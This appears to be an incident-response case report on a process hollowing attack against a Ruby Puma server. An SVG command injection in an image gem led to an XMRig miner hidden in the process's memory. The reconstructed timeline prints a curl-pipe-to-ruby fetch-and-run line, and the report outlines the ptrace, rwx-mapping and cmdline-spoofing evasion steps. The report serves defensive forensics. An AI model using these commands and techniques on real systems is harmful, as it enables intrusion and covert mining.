# Case 003: Ruby Process Hollowing Attack

## Summary

A process hollowing attack was discovered targeting a Ruby web application
server (Puma) where the attacker replaced the process memory contents with
a cryptocurrency miner while maintaining the original process name and PID.
The attack exploited a remote code execution vulnerability in an image
processing library to gain initial code execution, then used `ptrace` and
`/proc/self/mem` to overwrite the Ruby VM's instruction sequences (iseqs)
with mining code.

## Timeline

- **T-10d**: Attacker identifies RCE vulnerability in the `image_magic`
  gem's SVG processing path via a crafted SVG file upload.
- **T-5d**: Attacker uploads a malicious SVG that triggers code execution
  during thumbnail generation. The payload downloads a second stage.
- **T-3d**: The second stage performs process hollowing:
  1. Forks the Puma worker process
  2. Uses `ptrace(PTRACE_POKETEXT)` to overwrite iseq bytecode
  3. Replaces the main event loop with XMRig mining code
  4. Maintains the original `/proc/self/cmdline` to evade `ps` detection
- **T-0**: Anomalous CPU usage triggers investigation. Memory forensics
  reveals the hollowed process.

## Memory Forensic Findings

### Process Hollowing Evidence

1. **Iseq Corruption**: 89% of `T_IMEMO` (iseq) objects in the heap had
   bytecode that did not match any known Ruby instruction patterns. The
   bytecodes were replaced with native x86-64 instructions for the XMRig
   mining algorithm.

2. **Executable Heap**: Two anonymous memory regions at `0x7f1200000000`
   and `0x7f1200400000` (each 4MB) had `rwxp` permissions, containing
   JIT-compiled mining code. Normal Ruby processes do not have `rwx`
   heap regions of this size.

3. **String Artifacts**: Mining pool configuration strings were found:
   - `stratum+tcp://pool.minexmr.com:4444`
   - `wallet: 48edfHu7V9Z84Yg...` (Monero wallet address)
   - `worker: puma_worker_0`
   - `hashrate: 1847 H/s`

4. **Code Reconstruction**: The deobfuscator recovered the original
   shellcode loader that:
   - Maps anonymous memory with `mmap(PROT_READ|PROT_WRITE|PROT_EXEC)`
   - Copies XMRig binary from a Base64-encoded T_STRING object
   - Overwrites `rb_iseq_eval_body` function pointer to redirect execution
   - Patches `/proc/self/cmdline` to show original Puma command line

### Native Code Analysis

GDB analysis of the executable heap regions revealed:

- A complete XMRig v6.x binary loaded into process memory
- Custom stratum protocol implementation using Ruby's `Socket` class
- Anti-debugging checks using `ptrace(PTRACE_TRACEME)` to detect analysis
- Periodic check for `strace` and `gdb` processes to self-destruct

### Timeline Reconstruction

The timeline builder reconstructed the attack sequence from heap artifacts:

```
08:22:14 - SVG upload processed by image_magic gem
08:22:15 - RCE triggered: system("curl -s http://... | ruby")
08:22:17 - Second stage downloaded and executed
08:22:18 - Fork of Puma worker (new PID inherits parent's cmdline)
08:22:19 - ptrace attach to parent process
08:22:20 - Iseq bytecode overwritten (89% of iseqs modified)
08:22:21 - mmap of rwx regions for mining code
08:22:22 - Mining pool connection established
08:22:23 - cmdline patched to hide mining activity
```

### Resource Impact

- CPU usage: 95-100% across all cores (normally 5-15%)
- Memory: +380MB from baseline (mining buffers and code)
- Network: Consistent 50KB/s outbound to mining pool

## Root Cause

The `image_magic` gem (v2.1.3) had a command injection vulnerability in
its SVG-to-PNG conversion path. The gem passed user-supplied SVG attributes
directly to a shell command without sanitization, allowing the attacker to
inject arbitrary commands via a crafted `xlink:href` attribute.

## Recommendations

1. Update `image_magic` gem to v2.2.0+ (patched version)
2. Run image processing in isolated containers with no network access
3. Monitor for `rwx` memory mappings in Ruby processes (should be none)
4. Alert on T_IMEMO corruption patterns (bytecode integrity checking)
5. Deploy CPU usage anomaly detection for Ruby worker processes
6. Use seccomp-bpf to restrict `ptrace` and `mmap(PROT_EXEC)` syscalls

## Evidence Artifacts

- Memory dump: `case_003_puma_worker_22156.dump.gz`
- Executable heap regions: `rwx_region_0x7f1200000000.bin`
- Reconstructed XMRig binary: `extracted_miner.elf`
- Malicious SVG: `exploit_payload.svg` (quarantined)
- Network capture: `case_003_mining_traffic.pcap`
